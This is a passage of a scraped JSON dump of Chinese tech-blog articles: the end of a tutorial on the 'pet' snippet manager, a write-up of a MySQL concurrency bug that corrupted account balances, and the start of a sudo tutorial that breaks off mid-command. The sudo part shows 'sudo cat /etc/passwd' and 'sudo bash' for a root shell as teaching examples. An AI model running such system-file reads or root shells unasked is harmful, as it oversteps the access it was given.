,=, ,\"\", ,gist_id, ,=, ,\"\", ,public, ,=, ,false,~, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,创建片段,\n,为了创建一个新的片段，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pet new\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pet ,new, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,添加命令和描述，然后按下回车键保存它。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nCommand> echo 'Hell1o, Welcome1 2to OSTechNix4' | tr -d '1-9'\r\nDescription> Remove numbers from output.\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,Command,>, ,echo, ,'Hell1o, Welcome1 2to OSTechNix4', ,|, ,tr, ,-,d, ,'1-9',Description,>, ,Remove ,numbers ,from ,output,., ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,这是一个简单的命令，用于从 ,echo, 命令输出中删除所有数字。你可以很轻松地记住它。但是，如果你很少使用它，几天后你可能会完全忘记它。当然，我们可以使用 ,CTRL+R, 搜索历史记录，但 Pet 会更容易。另外，Pet 可以帮助你添加任意数量的条目。,\n,另一个很酷的功能是我们可以轻松添加以前的命令。为此，在你的 ,.bashrc, 或 ,.zshrc, 文件中添加以下行。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfunction prev() {\r\n PREV=$(fc -lrn | head -n 1)\r\n sh -c \"pet new `printf %q \"$PREV\"`\"\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,function, ,prev,(,), ,{, ,PREV,=,$,(,fc, ,-,lrn, ,|, ,head, ,-,n, ,1,), ,sh, ,-,c, ,\"pet new `printf %q \",$,PREV,\"`\",}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,执行以下命令来使保存的更改生效。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsource .bashrc\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,source, ,.,bashrc, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,或者：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsource .zshrc\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,source, ,.,zshrc, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在，运行任何命令，例如：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cat Documents/ostechnix.txt | tr '|' '\\n' | sort | tr '\\n' '|' | sed \"s/.$/\\\\n/g\"\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cat ,Documents,/,ostechnix,.,txt, ,|, ,tr, ,'|', ,'\\n', ,|, ,sort, ,|, ,tr, ,'\\n', ,'|', ,|, ,sed, ,\"s/.$/\\\\n/g\", ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,要添加上述命令，你不必使用 ,pet new, 命令。只需要：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ prev\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,prev, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,将说明添加到该命令代码片段中，然后按下回车键保存。,\n,\n,片段列表,\n,要查看保存的片段，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pet list\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pet ,list, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,编辑片段,\n,如果你想编辑代码片段的描述或命令，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pet edit\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pet ,edit, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这将在你的默认文本编辑器中打开所有保存的代码片段，你可以根据需要编辑或更改片段。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[[snippets]]\r\n description = \"Remove numbers from output.\"\r\n command = \"echo 'Hell1o, Welcome1 2to OSTechNix4' | tr -d '1-9'\"\r\n output = \"\"\r\n\r\n[[snippets]]\r\n description = \"Alphabetically sort one line of text\"\r\n command = \"\\t prev\"\r\n output = \"\"\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,[,snippets,],], ,description, ,=, ,\"Remove numbers from output.\", ,command, ,=, ,\"echo 'Hell1o, Welcome1 2to OSTechNix4' | tr -d '1-9'\", ,output, ,=, ,\"\", ,[,[,snippets,],], ,description, ,=, ,\"Alphabetically sort one line of text\", ,command, ,=, ,\"\\t prev\", ,output, ,=, ,\"\", ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,在片段中使用标签,\n,要将标签用于判断，使用下面的 ,-t, 标志。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pet new -t\r\nCommand> echo 'Hell1o, Welcome1 2to OSTechNix4' | tr -d '1-9\r\nDescription> Remove numbers from output.\r\nTag> tr command examples\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pet ,new, ,-,t,Command,>, ,echo, ,'Hell1o, Welcome1 2to OSTechNix4', ,|, ,tr, ,-,d, ,',1,-,9,Description,>, ,Remove ,numbers ,from ,output,.,Tag,>, ,tr ,command ,examples, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,执行片段,\n,要执行一个保存的片段，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pet exec\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pet ,exec, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,从列表中选择你要运行的代码段，然后按回车键来运行它：,\n,\n,记住你需要安装 fzf 或 peco 才能使用此功能。,\n,寻找片段,\n,如果你有很多要保存的片段，你可以使用字符串或关键词如 below.qjz 轻松搜索它们。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pet search\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pet ,search, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输入搜索字词或关键字以缩小搜索结果范围。,\n,\n,同步片段,\n,首先，你需要获取访问令牌。转到此链接 ,https://github.com/settings/tokens/new, 并创建访问令牌（只需要 “gist” 范围）。,\n,使用以下命令来配置 Pet：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pet configure\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pet ,configure, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,将令牌设置到 ,[Gist], 字段中的 ,access_token,。,\n,设置完成后，你可以像下面一样将片段上传到 Gist。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pet sync -u\r\nGist ID: 2dfeeeg5f17e1170bf0c5612fb31a869\r\nUpload success\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pet ,sync, ,-,u,Gist ,ID,:, ,2dfeeeg5f17e1170bf0c5612fb31a869,Upload ,success, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你也可以在其他 PC 上下载片段。为此，编辑配置文件并在 ,[Gist], 中将 ,gist_id, 设置为 GIST id。,\n,之后，使用以下命令下载片段：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pet sync\r\nDownload success\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pet ,sync,Download ,success, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,获取更多细节，参阅帮助选项：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npet -h\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,pet, ,-,h, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,或者：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npet [command] -h\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,pet, ,[,command,], ,-,h, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这就是全部了。希望这可以帮助到你。正如你所看到的，Pet 使用相当简单易用！如果你很难记住冗长的命令，Pet 实用程序肯定会有用。,\n,干杯！,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113949/", "url_object_id": "d60ef196f154843a4e1ea191d377a33f", "front_image_path": "full/9db6cf3e596461e143833b81ce604c0fd5b87855.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "title": "线上账务系统余额并发更新问题记录", "create_time": "2018/04/24", "vote": "1", "bookmark": "2", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,hebaodan,   ,某电商平台，某天线上用户报bug说账户余额信息与交易流水对不上。可以认为是数据库并发更新问题，由此定位出具体原因，并给出解决方案。,\n,问题现象,\n,场景描述,\n,线上账务系统，在定时结算给卖家钱时，且高并发量的情况下，出现提现x元（假设当前用户余额为x元）余额为0后，再转入该账户一笔钱（假设为y元），结果账户余额变为了,x+y, 元，导致用户余额错误。 ps：账户余额的变更都是在事务中update的,\n,环境说明,\n,mysql5.7 + innodb，事务隔离级别是,REPEATABLE-READ,\n,场景模拟,\n,我们简化下线上的数据结构，进行场景模拟。 数据表如下： ‘账户主表’,\n, ,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nCREATE TABLE user (\r\nuid int(11) NOT NULL COMMENT '类型id+自增序列',\r\nname varchar(32) DEFAULT NULL,\r\nPRIMARY KEY (uid)\r\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='账户主表',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,CREATE ,TABLE ,user, ,(,uid ,int,(,11,), ,NOT, ,NULL, ,COMMENT, ,'类型id+自增序列',,,name ,varchar,(,32,), ,DEFAULT, ,NULL,,,PRIMARY ,KEY, ,(,uid,),), ,ENGINE,=,InnoDB ,DEFAULT, ,CHARSET,=,utf8 ,COMMENT,=,'账户主表',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,‘账户余额明细表’,\n, ,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nCREATE TABLE user_account (\r\nuid int(11) NOT NULL,\r\namount decimal(19,4) DEFAULT 0 COMMENT '账户余额',\r\nPRIMARY KEY (uid)\r\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='账户余额明细表',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,CREATE ,TABLE ,user_account, ,(,uid ,int,(,11,), ,NOT, ,NULL,,,amount ,decimal,(,19,,,4,), ,DEFAULT, ,0, ,COMMENT, ,'账户余额',,,PRIMARY ,KEY, ,(,uid,),), ,ENGINE,=,InnoDB ,DEFAULT, ,CHARSET,=,utf8 ,COMMENT,=,'账户余额明细表',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,账户类型配置,\n, ,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nCREATE TABLE user_conf (\r\ntype_id int(11) NOT NULL, description varchar(32) DEFAULT NULL COMMENT '类型描述', PRIMARY KEY (type_id) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='账户类型配置',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,CREATE ,TABLE ,user_conf, ,(,type_id ,int,(,11,), ,NOT, ,NULL,,, ,description ,varchar,(,32,), ,DEFAULT, ,NULL, ,COMMENT, ,'类型描述',,, ,PRIMARY ,KEY, ,(,type_id,), ,), ,ENGINE,=,InnoDB ,DEFAULT, ,CHARSET,=,utf8 ,COMMENT,=,'账户类型配置',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,具体数据为：,\n, ,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nselect * from user;\r\n+-------+------+ | uid | name | +-------+------+\r\n| 10001 | a |\r\n| 10002 | b |\r\nselect * from user_account;\r\n+-------+----------+ | uid | amount | +-------+----------+\r\n| 10001 | 10.0000 |\r\n| 10002 | 108.9900 |\r\nselect * from user_conf;\r\n+---------+--------------+ | type_id | description | +---------+--------------+\r\n| 100 | 外部账户 |\r\n| 200 | 内部账户 |,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,select *, ,from ,user,;,+,--,--,--,-,+,--,--,--,+, ,|, ,uid, ,|, ,name, ,|, ,+,--,--,--,-,+,--,--,--,+,|, ,10001, ,|, ,a, ,|,|, ,10002, ,|, ,b, ,|,select *, ,from ,user_account,;,+,--,--,--,-,+,--,--,--,--,--,+, ,|, ,uid, ,|, ,amount, ,|, ,+,--,--,--,-,+,--,--,--,--,--,+,|, ,10001, ,|, ,10.0000, ,|,|, ,10002, ,|, ,108.9900, ,|,select *, ,from ,user_conf,;,+,--,--,--,--,-,+,--,--,--,--,--,--,--,+, ,|, ,type_id, ,|, ,description, ,|, ,+,--,--,--,--,-,+,--,--,--,--,--,--,--,+,|, ,100, ,|, ,外部账户, ,|,|, ,200, ,|, ,内部账户, ,|,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,模拟,提现（即余额减）和入账（即余额加）,并发操作的事务,如下：,\n,\n,\n,\n,session1-提现10元,\n,session2-入账20元,\n,\n,\n,\n,\n,begin；,\n,\n,\n,\n,select description from user_conf where type_id = 100;,\n,\n,\n,\n,select * from user where uid = 10001 for update; // user表用来做互斥,\n,\n,\n,\n,select amount from user_account where uid = 10001; // 10.00,\n,\n,\n,\n,\n,begin;,\n,\n,\n,\n,select description from user_conf where type_id = 100;,\n,\n,\n,\n,select * from user where uid = 10001 for update; // ,wating,\n,\n,\n,\n,//wating,\n,\n,\n,update user_account set amount = 0.00 where uid = 10001;,\n,\n,\n,\n,commit;,\n,\n,\n,\n,\n,拿到锁,\n,\n,\n,\n,select amount from user_account where uid = 10001; //,10.00,\n,\n,\n,\n,入账20元，代码中计算后应该为30元,\n,\n,\n,\n,update user_account set amount = 30.00 where uid = 10001;,\n,\n,\n,\n,commit;,\n,\n,\n,\n,问题出现了，后面再查询该用户余额为30元，即用户提现的10元未反映在余额中,\n,原因定位,\n,熟悉mysql的同学或许已经知道问题是,由REPEATABLE-READ隔离级别下快照读导致,。,\n,具体解释：,\n,RR级别下，第一次读操作会生成快照，对于可见性来说，只有当第一次读之前其他事务提交的修改和自己的修改可见，其他的均不可见。,\n,官网文档：,https://dev.mysql.com/doc/refman/5.7/en/glossary.html, snapshot A representation of data at a particular time, which remains the same even as changes are committed by other transactions.,\n,With REPEATABLE READ isolation level, the snapshot is based on the time when the first read operation is performed.,\n,可见性原理,\n,可参考文章：,http://hedengcheng.com/?p=148,\n,回到上述模拟场景中，session2在sql语句,select description from user_conf where type_id = 100;, 时已生成快照，虽然session1提交了，但仍然不可见，导致并发更新问题。,\n,另外，开启事务后，,SELECT … FOR UPDATE 是不会生成快照的,，大家可自行实验,\n,解决方案,\n,方案一,\n,将REPEATABLE-READ隔离级别改为READ-COMMITTED，这样即能看到最新提交的数据。,\n,方案二,\n,在读’账户余额明细表’user_account 的时候加 for update，这样会 1.强制读该行记录的最新版本数据，2.且若其他事务未commit，本事务将阻塞，保证串行更新,\n,方案三,\n,延时生成快照。开启事务后，首先就通过user表做互斥，直接for update加锁，针对多个事务并发更新即变为串行。,\n,附：定位过程,\n,\n,针对上报bug用户，查询其交易流水明细与余额变更明细，确认账务存在问题,\n,查询账务系统近几天是否有上线变更，检查无,\n,拉取账务数据库mysql general log，找到并发更新的两个事务session,\n,查询数据库设置的隔离级别为RR，查询应用数据库连接池配置即,session的隔离级别未配置,，采用数据库配置,\n,确认由RR级别导致（当然也可以认为是代码问题导致）,\n,确认是一个月前账务系统分库分表上线，改用其他,连接池且未设置session隔离级别,。而之前是有配置session的隔离级别为READ-COMMITTED。,\n,\n,延伸思考,\n,mysql RR级别适用的业务场景是什么，应该怎么选择？ 有兴趣或有见解的同学可以留言回复或私信~~,\n,参考,\n,http://blog.csdn.net/chen77716/article/details/6742128#comments,\n,http://hedengcheng.com/?p=148,\n,https://liuzhengyang.github.io/2017/04/18/innodb-mvcc/,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113917/", "url_object_id": "e18020cb4a67969752b680d482555760", "front_image_path": "full/35011d6168be00e949624c665041dc724e3ad786.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/62b7a1070a67d4ff08c977612aa47ef3.jpg"], "title": "Linux 系统中 sudo 命令的 10 个技巧", "create_time": "2018/04/21", "vote": "1", "bookmark": "2", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Pradeep Kumar,   译文出处：,Linux中国/szcf-weiya,   ,\n,概览,\n,sudo, 表示 “,s,uper,u,ser ,do,”。 它允许已验证的用户以其他用户的身份来运行命令。其他用户可以是普通用户或者超级用户。然而，大部分时候我们用它来以提升的权限来运行命令。,\n,sudo, 命令与安全策略配合使用，默认安全策略是 ,sudoers,，可以通过文件 ,/etc/sudoers, 来配置。其安全策略具有高度可拓展性。人们可以开发和分发他们自己的安全策略作为插件。,\n,与 su 的区别,\n,在 GNU/Linux 中，有两种方式可以用提升的权限来运行命令：,\n,\n,使用 ,su, 命令,\n,使用 ,sudo, 命令,\n,\n,su, 表示 “,s,witch ,u,ser”。使用 ,su,，我们可以切换到 root 用户并且执行命令。但是这种方式存在一些缺点：,\n,\n,我们需要与他人共享 root 的密码。,\n,因为 root 用户为超级用户，我们不能授予受控的访问权限。,\n,我们无法审查用户在做什么。,\n,\n,sudo, 以独特的方式解决了这些问题。,\n,\n,首先，我们不需要妥协来分享 root 用户的密码。普通用户使用他们自己的密码就可以用提升的权限来执行命令。,\n,我们可以控制 ,sudo, 用户的访问，这意味着我们可以限制用户只执行某些命令。,\n,除此之外，,sudo, 用户的所有活动都会被记录下来，因此我们可以随时审查进行了哪些操作。在基于 Debian 的 GNU/Linux 中，所有活动都记录在 ,/var/log/auth.log, 文件中。,\n,\n,本教程后面的部分阐述了这些要点。,\n,实际动手操作 sudo,\n,现在，我们对 sudo 有了大致的了解。让我们实际动手操作吧。为了演示，我使用 Ubuntu。但是，其它发行版本的操作应该是相同的。,\n,允许 sudo 权限,\n,让我们添加普通用户为 ,sudo, 用户吧。在我的情形中，用户名为 ,linuxtechi,。,\n,1) 按如下所示编辑 ,/etc/sudoers, 文件：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo visudo\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,visudo, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,2) 添加以下行来允许用户 ,linuxtechi, 有 sudo 权限：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nlinuxtechi ALL=(ALL) ALL\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,linuxtechi ,ALL,=,(,ALL,), ,ALL, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上述命令中：,\n,\n,linuxtechi, 表示用户名,\n,第一个 ,ALL, 指示允许从任何终端、机器访问 ,sudo,\n,第二个 ,(ALL), 指示 ,sudo, 命令被允许以任何用户身份执行,\n,第三个 ,ALL, 表示所有命令都可以作为 root 执行,\n,\n,以提升的权限执行命令,\n,要用提升的权限执行命令，只需要在命令前加上 ,sudo,，如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo cat /etc/passwd\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,cat, ,/,etc,/,passwd, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,当你执行这个命令时，它会询问 ,linuxtechi, 的密码，而不是 root 用户的密码。,\n,以其他用户执行命令,\n,除此之外，我们可以使用 ,sudo, 以另一个用户身份执行命令。例如，在下面的命令中，用户 ,linuxtechi, 以用户 ,devesh, 的身份执行命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo -u devesh whoami\r\n[sudo] password for linuxtechi:\r\ndevesh\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo, ,-,u, ,devesh ,whoami,[,sudo,], ,password ,for, ,linuxtechi,:,devesh, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,内置命令行为,\n,sudo, 的一个限制是 —— 它无法使用 Shell 的内置命令。例如， ,history, 记录是内置命令，如果你试图用 ,sudo, 执行这个命令，那么会提示如下的未找到命令的错误：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo history\r\n[sudo] password for linuxtechi:\r\nsudo: history: command not found\r\n\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,history,[,sudo,], ,password ,for, ,linuxtechi,:,sudo,:, ,history,:, ,command ,not, ,found, , ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,访问 root shell,\n,为了克服上述问题，我们可以访问 root shell，并在那里执行任何命令，包括 Shell 的内置命令。,\n,要访问 root shell, 执行下面的命令:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo bash\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,bash, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,执行完这个命令后——您将观察到提示符变为井号（,#,）。,\n,技巧,\n,这节我们将讨论一些有用的技巧，这将有助于提高生产力。大多数命令可用于完成日常任务。,\n,以 sudo 用户执行之前的命令,\n,让我们假设你想用提升的权限执行之前的命令，那么下面的技巧将会很有用：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo 